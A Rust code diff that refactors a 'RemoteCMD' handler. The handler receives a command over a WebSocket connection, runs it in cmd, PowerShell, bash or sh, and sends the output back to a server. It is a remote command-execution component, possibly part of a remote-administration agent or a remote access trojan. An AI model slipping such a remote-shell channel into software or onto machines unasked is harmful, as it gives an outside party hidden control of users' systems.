@@ -1,28 +1,48 @@
+use futures_util::SinkExt;
+use serde_json::Value;
 use std::process::Command;
+use tokio_tungstenite::tungstenite::Message;
 
-use tungstenite::Message;
-
-use crate::handlers::func::{Context, Function};
+use crate::{
+    dev_print,
+    handlers::func::{Function, HandlerResult},
+    router::SocketWriter,
+};
 
 pub struct RemoteCMD;
 
+#[async_trait::async_trait]
 impl Function for RemoteCMD {
-    fn handler(payload: &[u8], ctx: &mut Context) -> anyhow::Result<()> {
-        let cmd = String::from_utf8_lossy(&payload[1..]);
-        let mut mode = ("cmd", "/C");
-        if payload[0] == b'1' {
-            mode = ("powershell", "-Command");
-        };
-        let output = Command::new(mode.0)
-            .arg(mode.1)
-            .arg(&*cmd)
-            .output()
-            .expect("Failed to execute command");
-        let response = String::from_utf8_lossy(&output.stdout);
+    async fn handler<'a>(args: Value, socket: &'a mut SocketWriter) -> HandlerResult {
+        let cmd = args["command"].as_str().unwrap_or_default();
 
-        ctx.socket
-            .send(Message::from(response.to_string()))
-            .expect("Failed to send response");
+        #[cfg(target_os = "windows")]
+        let default_shell = ("cmd", "/C");
+        #[cfg(not(target_os = "windows"))]
+        let default_shell = ("sh", "-c");
+
+        let mode = match args["shell"].as_str() {
+            Some("powershell") => ("powershell", "-Command"),
+            Some("bash") => ("bash", "-c"),
+            Some("sh") => ("sh", "-c"),
+            Some("cmd") => ("cmd", "/C"),
+            _ => default_shell,
+        };
+
+        let output_result = Command::new(mode.0).arg(mode.1).arg(cmd).output();
+
+        let response_str = match output_result {
+            Ok(output) => {
+                String::from_utf8_lossy(&[output.stdout, output.stderr].concat()).to_string()
+            }
+            Err(e) => {
+                format!("Failed to execute command '{}': {}", mode.0, e)
+            }
+        };
+
+        socket.send(Message::Text(response_str)).await?;
+        dev_print!("Response sent to server.");
+
         Ok(())
     }
 }
